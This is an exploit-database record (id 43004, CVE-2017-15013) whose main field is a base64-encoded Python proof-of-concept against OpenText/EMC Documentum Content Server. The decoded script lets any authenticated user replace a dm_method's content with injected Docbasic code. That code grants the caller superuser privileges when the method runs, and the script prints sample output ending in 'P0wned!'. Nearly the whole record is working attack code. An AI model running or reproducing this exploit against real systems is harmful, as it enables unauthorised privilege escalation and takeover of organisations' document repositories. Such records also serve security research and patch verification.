{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCiMgT3BlbnRleHQgRG9jdW1lbnR1bSBDb250ZW50IFNlcnZlciAoZm9ybWVybHkga25vd24gYXMgRU1DIERvY3VtZW50dW0gQ29udGVudCBTZXJ2ZXIpDQojIGNvbnRhaW5zIGZvbGxvd2luZyBkZXNpZ24gZ2FwLCB3aGljaCBhbGxvd3MgYXV0aGVudGljYXRlZCB1c2VyIHRvIGdhaW4gcHJpdmlsZWdlcw0KIyBvZiBzdXBlcnVzZXI6DQojDQojIENvbnRlbnQgU2VydmVyIHN0b3JlcyBpbmZvcm1hdGlvbiBhYm91dCB1cGxvYWRlZCBmaWxlcyBpbiBkbXJfY29udGVudCBvYmplY3RzLA0KIyB3aGljaCBhcmUgcXVlcnlhYmxlIGFuZCAiZWRpdGFibGUiIChiZWZvcmUgcmVsZWFzZSA3LjJQMDIgYW55IGF1dGhlbnRpY2F0ZWQgdXNlcg0KIyB3YXMgYWJsZSB0byBlZGl0IGRtcl9jb250ZW50IG9iamVjdHMsIG5vdyBhbnkgYXV0aGVudGljYXRlZCB1c2VyIG1heSBkZWxldGUNCiMgZG1yX2NvbnRlbnQgb2JqZWN0IGFuZCB0aGVtIGNyZWF0ZSBuZXcgb25lIHdpdGggdGhlIG9sZCBpZGVudGlmaWVyKSBieQ0KIyBhdXRoZW50aWNhdGVkIHVzZXJzLCB0aGlzIGFsbG93cyBhbnkgYXV0aGVudGljYXRlZCB1c2VyIHRvICJtb2RpZnkiIHNlY3VyaXR5LXNlbnNpdGl2ZQ0KIyBkbXJfY29udGVudCBvYmplY3RzIChmb3IgZXhhbXBsZSwgZG1yX2NvbnRlbnQgcmVsYXRlZCB0byBkbV9tZXRob2Qgb2JqZWN0cykNCiMgYW5kIGdhaW4gc3VwZXJ1c2VyIHByaXZpbGVnZXMNCiMNCiMgVGhlIFBvQyBiZWxvdyBkZW1vbnN0cmF0ZXMgdGhpcyB2dWxuZXJhYmlsaXR5Og0KIw0KIyBNYWNCb29rLVBybzp+ICQgcHl0aG9uIENWRS0yMDE3LTE1MDEzLnB5DQojIHVzYWdlOg0KIyBDVkUtMjAxNy0xNTAxMy5weSBob3N0IHBvcnQgdXNlciBwYXNzd29yZA0KIyBNYWNCb29rLVBybzp+ICQgcHl0aG9uIENWRS0yMDE3LTE1MDEzLnB5IGRvY3U3MmRldjAxIDEwMDAxIGRtX2JvZl9yZWdpc3RyeSBkbV9ib2ZfcmVnaXN0cnkNCiMgVHJ5aW5nIHRvIGNvbm5lY3QgdG8gZG9jdTcyZGV2MDE6MTAwMDEgYXMgZG1fYm9mX3JlZ2lzdHJ5IC4uLg0KIyBDb25uZWN0ZWQgdG8gZG9jdTcyZGV2MDE6MTAwMDEsIGRvY2Jhc2U6IERDVE1fREVWLCB2ZXJzaW9uOiA3LjIuMDI3MC4wMzc3ICBMaW51eDY0Lk9yYWNsZQ0KIyBUcnlpbmcgdG8gZmluZCBhbnkgZG1fbWV0aG9kIG9iamVjdCB3aXRoIGNvbnRlbnQuLi4NCiMgICAgIFRyeWluZyB0byBwb2lzb24gZG9jYmFzZSBtZXRob2QgZG1fTWlncmF0aW9uDQojIE1ldGhvZCB2ZXJiOiBkbWJhc2ljIC1lTWlncmF0aW9uX0FnZW50DQojIE1ldGhvZCBmdW5jdGlvbjogTWlncmF0aW9uX0FnZW50DQojIFRyeWluZyB0byBpbmplY3QgbmV3IGNvbnRlbnQ6DQojIENvbnN0IGdsYWJlbCBBcyBTdHJpbmcgICAgICAgICAgPSAiTGFiZWwiDQojIENvbnN0IGdpbmZvIEFzIFN0cmluZyAgICAgICAgICAgPSAiSW5mbyINCiMgQ29uc3QgZ2Vycm9yIEFzIFN0cmluZyAgICAgICAgICA9ICJFcnJvciINCiMNCiMgUHJpdmF0ZSBTdWIgUHJpbnRNZXNzYWdlKG1zc2cgQXMgU3RyaW5nLCBtc3NndHlwZSBBcyBTdHJpbmcpDQojIElmKG1zc2d0eXBlPWdsYWJlbCkgVGhlbg0KIyBQcmludCAiPEJSPjxCPjxGT05UIHNpemU9Mz4iDQojIFByaW50IG1zc2cNCiMgcHJpbnQgIjwvRk9OVD48L0I+Ig0KIyBFbHNlSWYobXNzZ3R5cGU9Z2luZm8pIFRoZW4NCiMgUHJpbnQgIjxCUj48Rk9OVCBjb2xvcj1ibHVlPiINCiMgUHJpbnQgbXNzZw0KIyBwcmludCAiPC9GT05UPiINCiMgRWxzZUlmKG1zc2d0eXBlPWdlcnJvcikgVGhlbg0KIyBQcmludCAiPEJSPjxGT05UIGNvbG9yPXJlZCBzaXplPTM+Ig0KIyBQcmludCBtc3NnDQojIHByaW50ICI8L0ZPTlQ+Ig0KIyBFbHNlDQojIFByaW50ICI8QlI+IiAmIG1zc2cNCiMgRW5kIElmDQojIEVuZCBTdWINCiMgUHJpdmF0ZSBTdWIgU2V0dXBTdXBlclVzZXIoVGFyZ2V0VXNlciBBcyBTdHJpbmcpDQojIG9iamVjdGlkJCA9IGRtQVBJR2V0KCJpZCxjLGRtX3VzZXIgd2hlcmUgdXNlcl9uYW1lID0gJyIgJiBUYXJnZXRVc2VyICYgIiciKQ0KIyBJZiBvYmplY3RpZCQgPD4gIiIgdGhlbg0KIyBTdGF0dXMgPSBkbUFQSVNldCgic2V0LGMsIiAmIG9iamVjdGlkJCAmICIsdXNlcl9wcml2aWxlZ2VzIiwxNikNCiMgU3RhdHVzID0gZG1BUElFeGVjKCJzYXZlLGMsIiAmIG9iamVjdGlkJCkNCiMgRW5kIElmDQojIEVuZCBTdWINCiMNCiMgU3ViIE1pZ3JhdGlvbl9BZ2VudChEb2NiYXNlTmFtZSBBcyBTdHJpbmcsIFVzZXJOYW1lIEFzIFN0cmluZywgVGFyZ2V0VXNlciBBcyBTdHJpbmcpDQojIERpbSBTZXNzaW9uSUQgQXMgU3RyaW5nDQojDQojIFNlc3Npb25JRD0gZG1BUElHZXQoImNvbm5lY3QsIiAmIERvY2Jhc2VOYW1lICYgIiwiICYgVXNlck5hbWUgJiAiLCIpDQojIElmIFNlc3Npb25JRCA9IiIgVGhlbg0KIyBQcmludCAiRmFpbCB0byBjb25uZWN0IHRvIGRvY2Jhc2UgIiAmIERvY2Jhc2VOYW1lICYiIGFzIHVzZXIgIiAmIFVzZXJOYW1lDQojIERtRXhpdCgtMSkNCiMgRWxzZQ0KIyBQcmludCAiQ29ubmVjdCB0byBkb2NiYXNlICIgJiBEb2NiYXNlTmFtZSAmIiBhcyB1c2VyICIgJiBVc2VyTmFtZQ0KIyBFbmQgSWYNCiMNCiMgQ2FsbCBTZXR1cFN1cGVyVXNlcihUYXJnZXRVc2VyKQ0KIw0KIyBFbmQgU3ViDQojDQojIFJlbW92aW5nIG1ldGhvZCdzIGNvbnRlbnQNCiMgbWV0aG9kJ3MgY29udGVudCBoYXMgYmVlbiBzdWNjZXNzZnVsbHkgcmVtb3ZlZA0KIyBDcmVhdGluZyBtYWxpY2lvdXMgZG1yX2NvbnRlbnQgb2JqZWN0DQojIE1hbGljaW91cyBkbXJfY29udGVudCBvYmplY3QgaGFzIGJlZW4gc3VjY2Vzc2Z1bGx5IGNyZWF0ZWQNCiMgQmVjb21pbmcgc3VwZXJ1c2VyLi4uDQojIFAwd25lZCENCiMgTWFjQm9vay1Qcm86fiAkIHB5dGhvbiBDVkUtMjAxNy0xNTAxMy5weSBkb2N1NzJkZXYwMSAxMDAwMSBkbV9ib2ZfcmVnaXN0cnkgZG1fYm9mX3JlZ2lzdHJ5DQojIFRyeWluZyB0byBjb25uZWN0IHRvIGRvY3U3MmRldjAxOjEwMDAxIGFzIGRtX2JvZl9yZWdpc3RyeSAuLi4NCiMgQ29ubmVjdGVkIHRvIGRvY3U3MmRldjAxOjEwMDAxLCBkb2NiYXNlOiBEQ1RNX0RFViwgdmVyc2lvbjogNy4yLjAyNzAuMDM3NyAgTGludXg2NC5PcmFjbGUNCiMgQ3VycmVudCB1c2VyIGlzIGEgc3VwZXJ1c2VyLCBub3RoaW5nIHRvIGRvDQojDQoNCg0KDQppbXBvcnQgc29ja2V0DQppbXBvcnQgc3lzDQoNCmZyb20gZGN0bXB5IGltcG9ydCBOVUxMX0lELCBSUENfQVBQTFlfRk9SX0JPT0wsIFJQQ19BUFBMWV9GT1JfT0JKRUNUDQoNCmZyb20gZGN0bXB5LmRvY2Jhc2VjbGllbnQgaW1wb3J0IERvY2Jhc2VDbGllbnQNCmZyb20gZGN0bXB5Lm9iai50eXBlZG9iamVjdCBpbXBvcnQgVHlwZWRPYmplY3QNCg0KQ0lQSEVSUyA9ICJBTEw6YU5VTEw6IWVOVUxMIg0KDQoNCmRlZiB1c2FnZSgpOg0KICAgIHByaW50ICJ1c2FnZTpcbiVzIGhvc3QgcG9ydCB1c2VyIHBhc3N3b3JkIiAlIHN5cy5hcmd2WzBdDQoNCg0KZGVmIG1haW4oKToNCiAgICBpZiBsZW4oc3lzLmFyZ3YpICE9IDU6DQogICAgICAgIHVzYWdlKCkNCiAgICAgICAgZXhpdCgxKQ0KDQogICAgKHNlc3Npb24sIGRvY2Jhc2UpID0gY3JlYXRlX3Nlc3Npb24oKnN5cy5hcmd2WzE6NV0pDQoNCiAgICBpZiBpc19zdXBlcl91c2VyKHNlc3Npb24pOg0KICAgICAgICBwcmludCAiQ3VycmVudCB1c2VyIGlzIGEgc3VwZXJ1c2VyLCBub3RoaW5nIHRvIGRvIg0KICAgICAgICBleGl0KDEpDQoNCiAgICBwcmludCAiVHJ5aW5nIHRvIGZpbmQgYW55IGRtX21ldGhvZCBvYmplY3Qgd2l0aCBjb250ZW50Li4uIg0KICAgIG1ldGhvZF9vYmplY3QgPSBzZXNzaW9uLmdldF9ieV9xdWFsaWZpY2F0aW9uKA0KICAgICAgICAiZG1fbWV0aG9kIFdIRVJFIHVzZV9tZXRob2RfY29udGVudD1UUlVFICINCiAgICAgICAgImFuZCBtZXRob2RfdmVyYiBsaWtlICdkbWJhc2ljIC1lJSciKQ0KICAgIG1ldGhvZF9jb250ZW50ID0gc2Vzc2lvbi5nZXRfYnlfcXVhbGlmaWNhdGlvbigNCiAgICAgICAgImRtcl9jb250ZW50IHdoZXJlIGFueSBwYXJlbnRfaWQ9JyVzJyINCiAgICAgICAgJSBtZXRob2Rfb2JqZWN0WydyX29iamVjdF9pZCddKQ0KDQogICAgcHJpbnQgIlRyeWluZyB0byBwb2lzb24gZG9jYmFzZSBtZXRob2QgJXMiICUgbWV0aG9kX29iamVjdFsnb2JqZWN0X25hbWUnXQ0KICAgIG1ldGhvZF92ZXJiID0gbWV0aG9kX29iamVjdFsnbWV0aG9kX3ZlcmInXQ0KICAgIHByaW50ICJNZXRob2QgdmVyYjogJXMiICUgbWV0aG9kX3ZlcmINCiAgICBtZXRob2RfZnVuY3Rpb24gPSBtZXRob2RfdmVyYltsZW4oImRtYmFzaWMgLWUiKTpdDQogICAgcHJpbnQgIk1ldGhvZCBmdW5jdGlvbjogJXMiICUgbWV0aG9kX2Z1bmN0aW9uDQogICAgbmV3X2NvbnRlbnQgPSBcDQogICAgICAgICJDb25zdCBnbGFiZWwgQXMgU3RyaW5nICAgICAgICAgID0gXCJMYWJlbFwiXG4iIFwNCiAgICAgICAgIkNvbnN0IGdpbmZvIEFzIFN0cmluZyAgICAgICAgICAgPSBcIkluZm9cIlxuIiBcDQogICAgICAgICJDb25zdCBnZXJyb3IgQXMgU3RyaW5nICAgICAgICAgID0gXCJFcnJvclwiXG4iIFwNCiAgICAgICAgIlxuIiBcDQogICAgICAgICJQcml2YXRlIFN1YiBQcmludE1lc3NhZ2UobXNzZyBBcyBTdHJpbmcsIG1zc2d0eXBlIEFzIFN0cmluZylcbiIgXA0KICAgICAgICAiICBJZihtc3NndHlwZT1nbGFiZWwpIFRoZW5cbiIgXA0KICAgICAgICAiICAgICAgICAgICAgUHJpbnQgXCI8QlI+PEI+PEZPTlQgc2l6ZT0zPlwiXG4iIFwNCiAgICAgICAgIiAgICAgICAgICAgIFByaW50IG1zc2dcbiIgXA0KICAgICAgICAiICAgICAgICAgICAgcHJpbnQgXCI8L0ZPTlQ+PC9CPlwiXG4iIFwNCiAgICAgICAgIiAgRWxzZUlmKG1zc2d0eXBlPWdpbmZvKSBUaGVuXG4iIFwNCiAgICAgICAgIiAgICAgICAgICAgIFByaW50IFwiPEJSPjxGT05UIGNvbG9yPWJsdWU+XCJcbiIgXA0KICAgICAgICAiICAgICAgICAgICAgUHJpbnQgbXNzZ1xuIiBcDQogICAgICAgICIgICAgICAgICAgICBwcmludCBcIjwvRk9OVD5cIlxuIiBcDQogICAgICAgICIgIEVsc2VJZihtc3NndHlwZT1nZXJyb3IpIFRoZW5cbiIgXA0KICAgICAgICAiICAgICAgICAgICAgUHJpbnQgXCI8QlI+PEZPTlQgY29sb3I9cmVkIHNpemU9Mz5cIlxuIiBcDQogICAgICAgICIgICAgICAgICAgICBQcmludCBtc3NnXG4iIFwNCiAgICAgICAgIiAgICAgICAgICAgIHByaW50IFwiPC9GT05UPlwiXG4iIFwNCiAgICAgICAgIiAgRWxzZVxuIiBcDQogICAgICAgICIgICAgICAgICAgICBQcmludCBcIjxCUj5cIiAmIG1zc2dcbiIgXA0KICAgICAgICAiICBFbmQgSWZcbiIgXA0KICAgICAgICAiRW5kIFN1YlxuIiBcDQogICAgICAgICJQcml2YXRlIFN1YiBTZXR1cFN1cGVyVXNlcihUYXJnZXRVc2VyIEFzIFN0cmluZylcbiIgXA0KICAgICAgICAiICAgb2JqZWN0aWQkID0gZG1BUElHZXQoXCJpZCxjLGRtX3VzZXIgd2hlcmUgdXNlcl9uYW1lID0gJ1wiICYgVGFyZ2V0VXNlciAmIFwiJ1wiKVxuIiBcDQogICAgICAgICIgICBJZiBvYmplY3RpZCQgPD4gXCJcIiB0aGVuXG4iIFwNCiAgICAgICAgIiAgICAgIFN0YXR1cyA9IGRtQVBJU2V0KFwic2V0LGMsXCIgJiBvYmplY3RpZCQgJiBcIix1c2VyX3ByaXZpbGVnZXNcIiwxNilcbiIgXA0KICAgICAgICAiICAgICAgU3RhdHVzID0gZG1BUElFeGVjKFwic2F2ZSxjLFwiICYgb2JqZWN0aWQkKVxuIiBcDQogICAgICAgICIgICBFbmQgSWZcbiIgXA0KICAgICAgICAiRW5kIFN1YlxuIiBcDQogICAgICAgICJcbiIgXA0KICAgICAgICAiU3ViICVzKERvY2Jhc2VOYW1lIEFzIFN0cmluZywgVXNlck5hbWUgQXMgU3RyaW5nLCBUYXJnZXRVc2VyIEFzIFN0cmluZylcbiIgXA0KICAgICAgICAiICBEaW0gU2Vzc2lvbklEIEFzIFN0cmluZ1xuIiBcDQogICAgICAgICJcbiIgXA0KICAgICAgICAiICBTZXNzaW9uSUQ9IGRtQVBJR2V0KFwiY29ubmVjdCxcIiAmIERvY2Jhc2VOYW1lICYgXCIsXCIgJiBVc2VyTmFtZSAmIFwiLFwiKVxuIiBcDQogICAgICAgICIgIElmIFNlc3Npb25JRCA9XCJcIiBUaGVuXG4iIFwNCiAgICAgICAgIiAgICBQcmludCBcIkZhaWwgdG8gY29ubmVjdCB0byBkb2NiYXNlIFwiICYgRG9jYmFzZU5hbWUgJlwiIGFzIHVzZXIgXCIgJiBVc2VyTmFtZVxuIiBcDQogICAgICAgICIgICAgRG1FeGl0KC0xKVxuIiBcDQogICAgICAgICIgIEVsc2VcbiIgXA0KICAgICAgICAiICAgIFByaW50IFwiQ29ubmVjdCB0byBkb2NiYXNlIFwiICYgRG9jYmFzZU5hbWUgJlwiIGFzIHVzZXIgXCIgJiBVc2VyTmFtZVxuIiBcDQogICAgICAgICIgIEVuZCBJZlxuIiBcDQogICAgICAgICJcbiIgXA0KICAgICAgICAiICBDYWxsIFNldHVwU3VwZXJVc2VyKFRhcmdldFVzZXIpXG4iIFwNCiAgICAgICAgIlxuIiBcDQogICAgICAgICJFbmQgU3ViXG4iICUgbWV0aG9kX2Z1bmN0aW9uDQogICAgcHJpbnQgIlRyeWluZyB0byBpbmplY3QgbmV3IGNvbnRlbnQ6XG4lcyIgJSBuZXdfY29udGVudA0KDQogICAgc2Vzc2lvbi5hcHBseShOb25lLCBOVUxMX0lELCAiQkVHSU5fVFJBTlMiKQ0KDQogICAgaWYgbWV0aG9kX2NvbnRlbnQgaXMgbm90IE5vbmU6DQogICAgICAgIHByaW50ICJSZW1vdmluZyBtZXRob2QncyBjb250ZW50Ig0KICAgICAgICByZW1vdmUgPSBUeXBlZE9iamVjdChzZXNzaW9uPXNlc3Npb24pDQogICAgICAgIHJlbW92ZS5zZXRfc3RyaW5nKCJPQkpFQ1RfVFlQRSIsICJkbXJfY29udGVudCIpDQogICAgICAgIHJlbW92ZS5zZXRfaW50KCJpX3ZzdGFtcCIsIG1ldGhvZF9jb250ZW50WydpX3ZzdGFtcCddKQ0KICAgICAgICBvYmogPSBzZXNzaW9uLmFwcGx5KFJQQ19BUFBMWV9GT1JfQk9PTCwgbWV0aG9kX2NvbnRlbnRbJ3Jfb2JqZWN0X2lkJ10sICJkbURpc3BsYXlDb25maWdFeHB1bmdlIiwgcmVtb3ZlKQ0KICAgICAgICBpZiBvYmogIT0gVHJ1ZToNCiAgICAgICAgICAgIHByaW50ICJGYWlsZWQgdG8gcmVtb3ZlIG1ldGhvZCdzIGNvbnRlbnQsIGV4aXRpbmciDQogICAgICAgICAgICBlbmRfdHJhbihzZXNzaW9uLCBGYWxzZSkNCiAgICAgICAgICAgIGV4aXQoMSkNCiAgICAgICAgcHJpbnQgIm1ldGhvZCdzIGNvbnRlbnQgaGFzIGJlZW4gc3VjY2Vzc2Z1bGx5IHJlbW92ZWQiDQoNCiAgICBzdG9yZSA9IHNlc3Npb24uZ2V0X2J5X3F1YWxpZmljYXRpb24oImRtX3N0b3JlIikNCiAgICBmb3JtYXQgPSBzZXNzaW9uLmdldF9ieV9xdWFsaWZpY2F0aW9uKCJkbV9mb3JtYXQgd2hlcmUgbmFtZT0nY3J0ZXh0JyIpDQoNCiAgICBoYW5kbGUgPSBzZXNzaW9uLm1ha2VfcHVzaGVyKHN0b3JlWydyX29iamVjdF9pZCddKQ0KICAgIGlmIGhhbmRsZSA8IDE6DQogICAgICAgIHByaW50ICJVbmFibGUgdG8gY3JlYXRlIHB1c2hlciINCiAgICAgICAgZW5kX3RyYW4oc2Vzc2lvbiwgRmFsc2UpDQogICAgICAgIGV4aXQoMSkNCg0KICAgIGIgPSBieXRlYXJyYXkoKQ0KICAgIGIuZXh0ZW5kKG5ld19jb250ZW50KQ0KDQogICAgaWYgbm90IHNlc3Npb24uc3RhcnRfcHVzaChoYW5kbGUsIG1ldGhvZF9vYmplY3RbJ2lfY29udGVudHNfaWQnXSwgZm9ybWF0WydyX29iamVjdF9pZCddLCBsZW4oYikpOg0KICAgICAgICBwcmludCAiRmFpbGVkIHRvIHN0YXJ0IHB1c2giDQogICAgICAgIGVuZF90cmFuKHNlc3Npb24sIEZhbHNlKQ0KICAgICAgICBleGl0KDEpDQoNCiAgICBzZXNzaW9uLnVwbG9hZChoYW5kbGUsIGIpDQogICAgZGF0YV90aWNrZXQgPSBzZXNzaW9uLmVuZF9wdXNoX3YyKGhhbmRsZSlbJ0RBVEFfVElDS0VUJ10NCg0KICAgIHByaW50ICJDcmVhdGluZyBtYWxpY2lvdXMgZG1yX2NvbnRlbnQgb2JqZWN0Ig0KICAgIGNvbnRlbnQgPSBUeXBlZE9iamVjdChzZXNzaW9uPXNlc3Npb24pDQogICAgY29udGVudC5zZXRfc3RyaW5nKCJPQkpFQ1RfVFlQRSIsICJkbXJfY29udGVudCIpDQogICAgY29udGVudC5zZXRfYm9vbCgiSVNfTkVXX09CSkVDVCIsIFRydWUpDQogICAgY29udGVudC5zZXRfaWQoInN0b3JhZ2VfaWQiLCBzdG9yZVsncl9vYmplY3RfaWQnXSkNCiAgICBjb250ZW50LnNldF9pZCgiZm9ybWF0IiwgZm9ybWF0WydyX29iamVjdF9pZCddKQ0KICAgIGNvbnRlbnQuc2V0X2ludCgiZGF0YV90aWNrZXQiLCBkYXRhX3RpY2tldCkNCiAgICBjb250ZW50LnNldF9pZCgicGFyZW50X2lkIiwgbWV0aG9kX29iamVjdFsncl9vYmplY3RfaWQnXSkNCiAgICBjb250ZW50LnNldF9pbnQoInBhZ2UiLCAwKQ0KICAgIGNvbnRlbnQuc2V0X3N0cmluZygiZnVsbF9mb3JtYXQiLCBmb3JtYXRbJ25hbWUnXSkNCiAgICBjb250ZW50LnNldF9pbnQoImNvbnRlbnRfc2l6ZSIsIGxlbihiKSkNCiAgICBpZiBub3Qgc2Vzc2lvbi5zYXZlX2NvbnRfYXR0cnMobWV0aG9kX29iamVjdFsnaV9jb250ZW50c19pZCddLCBjb250ZW50KToNCiAgICAgICAgcHJpbnQgIkZhaWxlZCB0byBjcmVhdGUgY29udGVudCINCiAgICAgICAgZW5kX3RyYW4oc2Vzc2lvbiwgRmFsc2UpDQogICAgICAgIGV4aXQoMSkNCg0KICAgIHByaW50ICJNYWxpY2lvdXMgZG1yX2NvbnRlbnQgb2JqZWN0IGhhcyBiZWVuIHN1Y2Nlc3NmdWxseSBjcmVhdGVkIg0KDQogICAgZW5kX3RyYW4oc2Vzc2lvbiwgVHJ1ZSkNCg0KICAgIHByaW50ICJCZWNvbWluZyBzdXBlcnVzZXIuLi4iDQogICAgbWV0aG9kID0gVHlwZWRPYmplY3Qoc2Vzc2lvbj1zZXNzaW9uKQ0KICAgIG1ldGhvZC5zZXRfc3RyaW5nKCJNRVRIT0QiLCBtZXRob2Rfb2JqZWN0WydvYmplY3RfbmFtZSddKQ0KICAgIG1ldGhvZC5zZXRfc3RyaW5nKCJBUkdVTUVOVFMiLCAiJXMgJXMgJXMiICUgKA0KICAgICAgICBzZXNzaW9uLmRvY2Jhc2Vjb25maWdbJ29iamVjdF9uYW1lJ10sDQogICAgICAgIHNlc3Npb24uc2VydmVyY29uZmlnWydyX2luc3RhbGxfb3duZXInXSwNCiAgICAgICAgc3lzLmFyZ3ZbM10pKQ0KICAgIHNlc3Npb24uYXBwbHkoUlBDX0FQUExZX0ZPUl9PQkpFQ1QsIE5VTExfSUQsICJET19NRVRIT0QiLCBtZXRob2QpDQogICAgciA9IHNlc3Npb24ucXVlcnkoDQogICAgICAgICJTRUxFQ1QgdXNlcl9wcml2aWxlZ2VzIEZST00gZG1fdXNlciAiDQogICAgICAgICJXSEVSRSB1c2VyX25hbWU9VVNFUiIpIFwNCiAgICAgICAgLm5leHRfcmVjb3JkKClbDQogICAgICAgICd1c2VyX3ByaXZpbGVnZXMnXQ0KICAgIGlmIHIgIT0gMTY6DQogICAgICAgIHByaW50ICJGYWlsZWQiDQogICAgICAgIGV4aXQoMSkNCiAgICBwcmludCAiUDB3bmVkISINCg0KDQpkZWYgZW5kX3RyYW4oc2Vzc2lvbiwgY29tbWl0PUZhbHNlKToNCiAgICBvYmogPSBUeXBlZE9iamVjdChzZXNzaW9uPXNlc3Npb24pDQogICAgb2JqLnNldF9ib29sKCJDT01NSVQiLCBjb21taXQpDQogICAgc2Vzc2lvbi5hcHBseShOb25lLCBOVUxMX0lELCAiRU5EX1RSQU5TIiwgb2JqKQ0KDQoNCmRlZiBjcmVhdGVfc2Vzc2lvbihob3N0LCBwb3J0LCB1c2VyLCBwd2QpOg0KICAgIHByaW50ICJUcnlpbmcgdG8gY29ubmVjdCB0byAlczolcyBhcyAlcyAuLi4iICUgKGhvc3QsIHBvcnQsIHVzZXIpDQogICAgc2Vzc2lvbiA9IE5vbmUNCiAgICB0cnk6DQogICAgICAgIHNlc3Npb24gPSBEb2NiYXNlQ2xpZW50KA0KICAgICAgICAgICAgaG9zdD1ob3N0LCBwb3J0PWludChwb3J0KSwNCiAgICAgICAgICAgIHVzZXJuYW1lPXVzZXIsIHBhc3N3b3JkPXB3ZCkNCiAgICBleGNlcHQgc29ja2V0LmVycm9yLCBlOg0KICAgICAgICBpZiBlLmVycm5vID09IDU0Og0KICAgICAgICAgICAgc2Vzc2lvbiA9IERvY2Jhc2VDbGllbnQoDQogICAgICAgICAgICAgICAgaG9zdD1ob3N0LCBwb3J0PWludChwb3J0KSwNCiAgICAgICAgICAgICAgICB1c2VybmFtZT11c2VyLCBwYXNzd29yZD1wd2QsDQogICAgICAgICAgICAgICAgc2VjdXJlPVRydWUsIGNpcGhlcnM9Q0lQSEVSUykNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHJhaXNlIGUNCiAgICBkb2NiYXNlID0gc2Vzc2lvbi5kb2NiYXNlY29uZmlnWydvYmplY3RfbmFtZSddDQogICAgdmVyc2lvbiA9IHNlc3Npb24uc2VydmVyY29uZmlnWydyX3NlcnZlcl92ZXJzaW9uJ10NCiAgICBwcmludCAiQ29ubmVjdGVkIHRvICVzOiVzLCBkb2NiYXNlOiAlcywgdmVyc2lvbjogJXMiICUgXA0KICAgICAgICAgIChob3N0LCBwb3J0LCBkb2NiYXNlLCB2ZXJzaW9uKQ0KICAgIHJldHVybiAoc2Vzc2lvbiwgZG9jYmFzZSkNCg0KDQpkZWYgaXNfc3VwZXJfdXNlcihzZXNzaW9uKToNCiAgICB1c2VyID0gc2Vzc2lvbi5nZXRfYnlfcXVhbGlmaWNhdGlvbigiZG1fdXNlciBXSEVSRSB1c2VyX25hbWU9VVNFUiIpDQogICAgaWYgdXNlclsndXNlcl9wcml2aWxlZ2VzJ10gPT0gMTY6DQogICAgICAgIHJldHVybiBUcnVlDQogICAgZ3JvdXAgPSBzZXNzaW9uLmdldF9ieV9xdWFsaWZpY2F0aW9uKA0KICAgICAgICAiZG1fZ3JvdXAgd2hlcmUgZ3JvdXBfbmFtZT0nZG1fc3VwZXJ1c2VycycgIg0KICAgICAgICAiQU5EIGFueSBpX2FsbF91c2Vyc19uYW1lcz1VU0VSIikNCiAgICBpZiBncm91cCBpcyBub3QgTm9uZToNCiAgICAgICAgcmV0dXJuIFRydWUNCg0KICAgIHJldHVybiBGYWxzZQ0KDQoNCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQogICAgbWFpbigpDQo=", 
    "filename": "platforms/multiple/webapps/43004.py", 
    "id": "43004", 
    "cves": [
        "CVE-2017-15013"
    ]
}